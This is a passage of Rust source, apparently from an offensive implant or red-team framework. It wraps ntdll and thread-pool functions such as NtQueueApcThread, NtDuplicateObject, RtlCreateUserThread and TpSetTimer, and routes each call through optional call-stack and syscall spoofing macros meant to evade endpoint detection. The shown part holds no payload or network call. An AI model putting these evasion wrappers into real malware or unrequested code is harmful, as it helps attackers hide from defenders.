    /// * `ProcessInformation` - Pointer to a buffer that receives the requested information.
    /// * `ProcessInformationLength` - Size of the `ProcessInformation` buffer, in bytes.
    /// * `ReturnLength` - Optional pointer to a variable that receives the actual size of data returned.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtQueryInformationProcess(
        &mut self,
        ProcessHandle: HANDLE,
        ProcessInformationClass: PROCESSINFOCLASS,
        ProcessInformation: PVOID,
        ProcessInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS {
        let f: FnNtQueryInformationProcess = transmute(self.NtQueryInformationProcess_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            ProcessInformationClass as usize,
            ProcessInformation,
            ProcessInformationLength as usize,
            ReturnLength
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            ProcessInformationClass as usize,
            ProcessInformation,
            ProcessInformationLength as usize,
            ReturnLength
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            ProcessHandle,
            ProcessInformationClass,
            ProcessInformation,
            ProcessInformationLength,
            ReturnLength,
        )
    }

    // ── APC ──────────────────────────────────────────────────────────

    /// Queue a user-mode APC to a thread.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread to which the APC is queued.
    /// * `ApcRoutine` - Pointer to the APC routine to execute.
    /// * `ApcArgument1` - First argument passed to the APC routine.
    /// * `ApcArgument2` - Second argument passed to the APC routine.
    /// * `ApcArgument3` - Third argument passed to the APC routine.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtQueueApcThread(
        &mut self,
        ThreadHandle: HANDLE,
        ApcRoutine: PVOID,
        ApcArgument1: PVOID,
        ApcArgument2: PVOID,
        ApcArgument3: PVOID,
    ) -> NTSTATUS {
        let f: FnNtQueueApcThread = transmute(self.NtQueueApcThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ApcRoutine,
            ApcArgument1,
            ApcArgument2,
            ApcArgument3
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ApcRoutine,
            ApcArgument1,
            ApcArgument2,
            ApcArgument3
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            ThreadHandle,
            ApcRoutine,
            ApcArgument1,
            ApcArgument2,
            ApcArgument3,
        )
    }

    /// Set an event object to the signaled state.
    ///
    /// # Arguments
    ///
    /// * `EventHandle` - Handle to the event object to signal.
    /// * `PreviousState` - Optional pointer to a variable that receives the previous event state.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtSetEvent(&mut self, EventHandle: HANDLE, PreviousState: *mut LONG) -> NTSTATUS {
        let f: FnNtSetEvent = transmute(self.NtSetEvent_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            EventHandle,
            PreviousState
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            EventHandle,
            PreviousState
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(EventHandle, PreviousState)
    }

    /// Atomically signal one object and wait on another.
    ///
    /// # Arguments
    ///
    /// * `SignalHandle` - Handle to the object to signal.
    /// * `WaitHandle` - Handle to the object to wait on.
    /// * `Alertable` - If `TRUE`, the wait is alertable (APCs can interrupt it).
    /// * `Timeout` - Optional pointer to a timeout value (negative for relative, positive for absolute).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtSignalAndWaitForSingleObject(
        &mut self,
        SignalHandle: HANDLE,
        WaitHandle: HANDLE,
        Alertable: BOOLEAN,
        Timeout: PLARGE_INTEGER,
    ) -> NTSTATUS {
        let f: FnNtSignalAndWaitForSingleObject =
            transmute(self.NtSignalAndWaitForSingleObject_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            SignalHandle,
            WaitHandle,
            Alertable as usize,
            Timeout
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            SignalHandle,
            WaitHandle,
            Alertable as usize,
            Timeout
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(SignalHandle, WaitHandle, Alertable, Timeout)
    }

    /// Terminate a thread.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread to terminate, or null for the current thread.
    /// * `ExitStatus` - Exit status for the thread.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtTerminateThread(
        &mut self,
        ThreadHandle: HANDLE,
        ExitStatus: NTSTATUS,
    ) -> NTSTATUS {
        let f: FnNtTerminateThread = transmute(self.NtTerminateThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ExitStatus as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ExitStatus as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, ExitStatus)
    }

    /// Check for and deliver pending APCs on the calling thread.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtTestAlert(&mut self) -> NTSTATUS {
        let f: FnNtTestAlert = transmute(self.NtTestAlert_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(&self.syscall_spoof_config, f as *const core::ffi::c_void)
            as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f()
    }

    // ── Object Duplication ────────────────────────────────────────

    /// Duplicate an object handle into the same or another process.
    ///
    /// # Arguments
    ///
    /// * `SourceProcessHandle` - Handle to the source process containing the handle to duplicate.
    /// * `SourceHandle` - Handle to duplicate.
    /// * `TargetProcessHandle` - Handle to the target process that receives the duplicated handle.
    /// * `TargetHandle` - Pointer to a variable that receives the duplicated handle.
    /// * `DesiredAccess` - Access mask for the new handle.
    /// * `HandleAttributes` - Attributes for the new handle (e.g., `OBJ_INHERIT`).
    /// * `Options` - Duplication options (e.g., `DUPLICATE_SAME_ACCESS`, `DUPLICATE_CLOSE_SOURCE`).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtDuplicateObject(
        &mut self,
        SourceProcessHandle: HANDLE,
        SourceHandle: HANDLE,
        TargetProcessHandle: HANDLE,
        TargetHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        HandleAttributes: ULONG,
        Options: ULONG,
    ) -> NTSTATUS {
        let f: FnNtDuplicateObject = transmute(self.NtDuplicateObject_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            SourceProcessHandle,
            SourceHandle,
            TargetProcessHandle,
            TargetHandle,
            DesiredAccess as usize,
            HandleAttributes as usize,
            Options as usize,
        ) as NTSTATUS;

        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            SourceProcessHandle,
            SourceHandle,
            TargetProcessHandle,
            TargetHandle,
            DesiredAccess as usize,
            HandleAttributes as usize,
            Options as usize,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(
            SourceProcessHandle,
            SourceHandle,
            TargetProcessHandle,
            TargetHandle,
            DesiredAccess,
            HandleAttributes,
            Options,
        )
    }

    // ── Heap Allocation ──────────────────────────────────────────────

    /// Allocate a block from a heap.
    ///
    /// # Arguments
    ///
    /// * `HeapHandle` - Handle to the heap from which to allocate.
    /// * `Flags` - Heap allocation flags (e.g., `HEAP_ZERO_MEMORY`).
    /// * `Size` - Number of bytes to allocate.
    ///
    /// # Returns
    ///
    /// Pointer to the allocated memory block, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlAllocateHeap(
        &mut self,
        HeapHandle: PVOID,
        Flags: ULONG,
        Size: SIZE_T,
    ) -> PVOID {
        let f: FnRtlAllocateHeap = transmute(self.RtlAllocateHeap_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            HeapHandle,
            Flags as usize,
            Size
        ) as PVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(HeapHandle, Flags, Size)
    }

    // ── Thread Exit ──────────────────────────────────────────────────

    /// Terminate the calling thread (does not return).
    ///
    /// # Arguments
    ///
    /// * `ExitStatus` - Exit status code for the thread.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlExitUserThread(&self, ExitStatus: NTSTATUS) -> ! {
        let f: FnRtlExitUserThread = transmute(self.RtlExitUserThread_ptr);
        f(ExitStatus)
    }

    /// Free a block previously allocated from a heap.
    ///
    /// # Arguments
    ///
    /// * `HeapHandle` - Handle to the heap that contains the block to free.
    /// * `Flags` - Heap free flags.
    /// * `BaseAddress` - Pointer to the memory block to free.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlFreeHeap(
        &mut self,
        HeapHandle: PVOID,
        Flags: ULONG,
        BaseAddress: PVOID,
    ) -> BOOLEAN {
        let f: FnRtlFreeHeap = transmute(self.RtlFreeHeap_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            HeapHandle,
            Flags as usize,
            BaseAddress
        ) as BOOLEAN;
        #[cfg(not(feature = "spoof-uwd"))]
        f(HeapHandle, Flags, BaseAddress)
    }

    // ── String Operations ────────────────────────────────────────────

    /// Initialize an ANSI_STRING from a null-terminated C string.
    ///
    /// # Arguments
    ///
    /// * `DestinationString` - Pointer to the `ANSI_STRING` structure to initialize.
    /// * `SourceString` - Pointer to a null-terminated ANSI string to use as the source.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlInitAnsiString(
        &mut self,
        DestinationString: PANSI_STRING,
        SourceString: PCSZ,
    ) {
        let f: FnRtlInitAnsiString = transmute(self.RtlInitAnsiString_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(
                &self.spoof_config,
                f as *const core::ffi::c_void,
                DestinationString,
                SourceString
            );
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(DestinationString, SourceString)
    }

    /// Initialize a UNICODE_STRING from a null-terminated wide string.
    ///
    /// # Arguments
    ///
    /// * `DestinationString` - Pointer to the `UNICODE_STRING` structure to initialize.
    /// * `SourceString` - Pointer to a null-terminated wide (UTF-16) string to use as the source.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlInitUnicodeString(
        &mut self,
        DestinationString: PUNICODE_STRING,
        SourceString: PCWSTR,
    ) {
        let f: FnRtlInitUnicodeString = transmute(self.RtlInitUnicodeString_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(
                &self.spoof_config,
                f as *const core::ffi::c_void,
                DestinationString,
                SourceString
            );
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(DestinationString, SourceString)
    }

    /// Convert an ANSI string to a Unicode string.
    ///
    /// # Arguments
    ///
    /// * `DestinationString` - Pointer to the `UNICODE_STRING` that receives the converted string.
    /// * `SourceString` - Pointer to the source `ANSI_STRING` to convert.
    /// * `AllocateDestinationString` - If `TRUE`, the routine allocates the buffer for the destination string.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlAnsiStringToUnicodeString(
        &mut self,
        DestinationString: PUNICODE_STRING,
        SourceString: PCANSI_STRING,
        AllocateDestinationString: BOOLEAN,
    ) -> NTSTATUS {
        let f: FnRtlAnsiStringToUnicodeString = transmute(self.RtlAnsiStringToUnicodeString_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            DestinationString,
            SourceString,
            AllocateDestinationString as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(DestinationString, SourceString, AllocateDestinationString)
    }

    /// Free a Unicode string allocated by the runtime.
    ///
    /// # Arguments
    ///
    /// * `UnicodeString` - Pointer to the `UNICODE_STRING` whose buffer is to be freed.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlFreeUnicodeString(&mut self, UnicodeString: PUNICODE_STRING) {
        let f: FnRtlFreeUnicodeString = transmute(self.RtlFreeUnicodeString_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(
                &self.spoof_config,
                f as *const core::ffi::c_void,
                UnicodeString
            );
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(UnicodeString)
    }

    // ── Miscellaneous ────────────────────────────────────────────────

    /// Generate a pseudo-random number.
    ///
    /// # Arguments
    ///
    /// * `Seed` - Pointer to a seed value that is updated on each call.
    ///
    /// # Returns
    ///
    /// A pseudo-random `ULONG` value.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlRandomEx(&mut self, Seed: PULONG) -> ULONG {
        let f: FnRtlRandomEx = transmute(self.RtlRandomEx_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, Seed) as ULONG;
        #[cfg(not(feature = "spoof-uwd"))]
        f(Seed)
    }

    /// Enumerate heap entries.
    ///
    /// # Arguments
    ///
    /// * `HeapHandle` - Handle to the heap to enumerate.
    /// * `Entry` - Pointer to a `RTL_HEAP_WALK_ENTRY` structure that receives the next heap entry.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlWalkHeap(
        &mut self,
        HeapHandle: PVOID,
        Entry: PRTL_HEAP_WALK_ENTRY,
    ) -> NTSTATUS {
        let f: FnRtlWalkHeap = transmute(self.RtlWalkHeap_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            HeapHandle,
            Entry
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(HeapHandle, Entry)
    }

    // ── Timer Queue ──────────────────────────────────────────────────

    /// Create a timer queue for lightweight timers.
    ///
    /// # Arguments
    ///
    /// * `TimerQueueHandle` - Pointer to a variable that receives the handle to the new timer queue.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlCreateTimerQueue(&mut self, TimerQueueHandle: *mut HANDLE) -> NTSTATUS {
        let f: FnRtlCreateTimerQueue = transmute(self.RtlCreateTimerQueue_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            TimerQueueHandle
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(TimerQueueHandle)
    }

    /// Delete a timer queue and all associated timers.
    ///
    /// # Arguments
    ///
    /// * `TimerQueueHandle` - Handle to the timer queue to delete.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlDeleteTimerQueue(&mut self, TimerQueueHandle: HANDLE) -> NTSTATUS {
        let f: FnRtlDeleteTimerQueue = transmute(self.RtlDeleteTimerQueue_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            TimerQueueHandle
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(TimerQueueHandle)
    }

    /// Create a timer in a timer queue.
    ///
    /// # Arguments
    ///
    /// * `TimerQueueHandle` - Handle to the timer queue in which to create the timer.
    /// * `Handle` - Pointer to a variable that receives the handle to the new timer.
    /// * `Function` - Pointer to the callback function to invoke when the timer fires.
    /// * `Context` - Pointer to application-defined data passed to the callback.
    /// * `DueTime` - Time in milliseconds before the timer fires the first time.
    /// * `Period` - Timer period in milliseconds (0 for a one-shot timer).
    /// * `Flags` - Timer creation flags (e.g., `WT_EXECUTEINTIMERTHREAD`).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlCreateTimer(
        &mut self,
        TimerQueueHandle: HANDLE,
        Handle: *mut HANDLE,
        Function: PVOID,
        Context: PVOID,
        DueTime: u32,
        Period: u32,
        Flags: u32,
    ) -> NTSTATUS {
        let f: FnRtlCreateTimer = transmute(self.RtlCreateTimer_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            TimerQueueHandle,
            Handle,
            Function,
            Context,
            DueTime as usize,
            Period as usize,
            Flags as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            TimerQueueHandle,
            Handle,
            Function,
            Context,
            DueTime,
            Period,
            Flags,
        )
    }

    // ── Context Capture ──────────────────────────────────────────────

    /// Capture the calling thread's full register context.
    ///
    /// # Arguments
    ///
    /// * `ContextRecord` - Pointer to a `CONTEXT` structure that receives the captured register state.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlCaptureContext(&self, ContextRecord: PCONTEXT) {
        let f: FnRtlCaptureContext = transmute(self.RtlCaptureContext_ptr);
        f(ContextRecord)
    }

    /// Acquire an SRW lock in exclusive (write) mode.
    ///
    /// # Arguments
    ///
    /// * `SRWLock` - Pointer to the SRW lock to acquire exclusively.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlAcquireSRWLockExclusive(&mut self, SRWLock: PVOID) {
        let f: FnRtlAcquireSRWLockExclusive = transmute(self.RtlAcquireSRWLockExclusive_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, SRWLock);
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(SRWLock)
    }

    // ── Thread Creation (Legacy) ────────────────────────────────────

    /// Create a user-mode thread (legacy API).
    ///
    /// # Arguments
    ///
    /// * `Process` - Handle to the process in which the thread is created.
    /// * `ThreadSecurityDescriptor` - Optional pointer to a security descriptor for the thread.
    /// * `CreateSuspended` - If `TRUE`, the thread is created in a suspended state.
    /// * `ZeroBits` - Number of high-order address bits that must be zero in the stack base.
    /// * `MaximumStackSize` - Maximum stack size, in bytes.
    /// * `CommittedStackSize` - Initial committed stack size, in bytes.
    /// * `StartAddress` - Pointer to the thread start routine.
    /// * `Parameter` - Pointer to a parameter passed to the start routine.
    /// * `Thread` - Optional pointer to a variable that receives the thread handle.
    /// * `ClientId` - Optional pointer to a `CLIENT_ID` that receives the thread/process IDs.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlCreateUserThread(
        &mut self,
        Process: HANDLE,
        ThreadSecurityDescriptor: PSECURITY_DESCRIPTOR,
        CreateSuspended: BOOLEAN,
        ZeroBits: ULONG,
        MaximumStackSize: SIZE_T,
        CommittedStackSize: SIZE_T,
        StartAddress: PUSER_THREAD_START_ROUTINE,
        Parameter: PVOID,
        Thread: PHANDLE,
        ClientId: PCLIENT_ID,
    ) -> NTSTATUS {
        let f: FnRtlCreateUserThread = transmute(self.RtlCreateUserThread_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Process,
            ThreadSecurityDescriptor,
            CreateSuspended as usize,
            ZeroBits as usize,
            MaximumStackSize,
            CommittedStackSize,
            transmute::<_, *const core::ffi::c_void>(StartAddress),
            Parameter,
            Thread,
            ClientId
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            Process,
            ThreadSecurityDescriptor,
            CreateSuspended,
            ZeroBits,
            MaximumStackSize,
            CommittedStackSize,
            StartAddress,
            Parameter,
            Thread,
            ClientId,
        )
    }

    // ── Memory Locking ────────────────────────────────────────────────

    /// Lock virtual memory pages into physical memory.
    ///
    /// # Arguments
    ///
    /// * `ProcessHandle` - Handle to the process whose pages are to be locked.
    /// * `BaseAddress` - Pointer to a variable containing the base address of the region to lock.
    /// * `RegionSize` - Pointer to a variable that specifies the size of the region to lock.
    /// * `MapType` - Type of lock operation (e.g., `MAP_PROCESS` or `MAP_SYSTEM`).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtLockVirtualMemory(
        &mut self,
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        RegionSize: PSIZE_T,
        MapType: ULONG,
    ) -> NTSTATUS {
        let f: FnNtLockVirtualMemory = transmute(self.NtLockVirtualMemory_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            RegionSize,
            MapType as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            RegionSize,
            MapType as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ProcessHandle, BaseAddress, RegionSize, MapType)
    }

    // ── Thread Pool ──────────────────────────────────────────────────

    /// Create a new thread pool.
    ///
    /// # Arguments
    ///
    /// * `PoolReturn` - Pointer to a variable that receives the new pool object.
    /// * `Reserved` - Reserved; must be null.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpAllocPool(&mut self, PoolReturn: *mut PVOID, Reserved: PVOID) -> NTSTATUS {
        let f: FnTpAllocPool = transmute(self.TpAllocPool_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            PoolReturn,
            Reserved,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(PoolReturn, Reserved)
    }

    /// Set stack commit/reserve sizes for pool threads.
    ///
    /// # Arguments
    ///
    /// * `Pool` - Pointer to the thread pool object.
    /// * `PoolStackInformation` - Pointer to a `TP_POOL_STACK_INFORMATION` structure specifying stack sizes.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpSetPoolStackInformation(
        &mut self,
        Pool: PVOID,
        PoolStackInformation: *mut TP_POOL_STACK_INFORMATION,
    ) -> NTSTATUS {
        let f: FnTpSetPoolStackInformation = transmute(self.TpSetPoolStackInformation_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Pool,
            PoolStackInformation,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(Pool, PoolStackInformation)
    }

    /// Set the minimum number of threads in a pool.
    ///
    /// # Arguments
    ///
    /// * `Pool` - Pointer to the thread pool object.
    /// * `MinThreads` - Minimum number of threads to maintain in the pool.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpSetPoolMinThreads(&mut self, Pool: PVOID, MinThreads: DWORD) -> NTSTATUS {
        let f: FnTpSetPoolMinThreads = transmute(self.TpSetPoolMinThreads_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Pool,
            MinThreads,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(Pool, MinThreads)
    }

    /// Set the maximum number of threads in a pool.
    ///
    /// # Arguments
    ///
    /// * `Pool` - Pointer to the thread pool object.
    /// * `MaxThreads` - Maximum number of threads allowed in the pool.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpSetPoolMaxThreads(&mut self, Pool: PVOID, MaxThreads: DWORD) -> NTSTATUS {
        let f: FnTpSetPoolMaxThreads = transmute(self.TpSetPoolMaxThreads_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Pool,
            MaxThreads,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        {
            f(Pool, MaxThreads);
            STATUS_SUCCESS
        }
    }

    /// Allocate a thread pool timer object.
    ///
    /// # Arguments
    ///
    /// * `Timer` - Pointer to a variable that receives the new timer object.
    /// * `Callback` - Pointer to the callback function invoked when the timer fires.
    /// * `Context` - Pointer to application-defined data passed to the callback.
    /// * `CallbackEnviron` - Optional pointer to a `TP_CALLBACK_ENVIRON_V3` for pool/group binding.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpAllocTimer(
        &mut self,
        Timer: *mut PVOID,
        Callback: PVOID,
        Context: PVOID,
        CallbackEnviron: *mut TP_CALLBACK_ENVIRON_V3,
    ) -> NTSTATUS {
        let f: FnTpAllocTimer = transmute(self.TpAllocTimer_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Timer,
            Callback,
            Context,
            CallbackEnviron,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(Timer, Callback, Context, CallbackEnviron)
    }

    /// Arm a thread pool timer with a due time.
    ///
    /// # Arguments
    ///
    /// * `Timer` - Pointer to the timer object to arm.
    /// * `DueTime` - Pointer to the due time (negative for relative, positive for absolute).
    /// * `Period` - Timer period in milliseconds (0 for a one-shot timer).
    /// * `WindowLength` - Maximum acceptable delay in milliseconds before the timer fires.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpSetTimer(
        &mut self,
        Timer: PVOID,
        DueTime: PLARGE_INTEGER,
        Period: DWORD,
        WindowLength: DWORD,
    ) -> NTSTATUS {
        let f: FnTpSetTimer = transmute(self.TpSetTimer_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Timer,
            DueTime,
            Period,
            WindowLength,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        {
            f(Timer, DueTime, Period, WindowLength);
            STATUS_SUCCESS
        }
    }

    /// Allocate a thread pool wait object.
    ///
    /// # Arguments
    ///
    /// * `Wait` - Pointer to a variable that receives the new wait object.
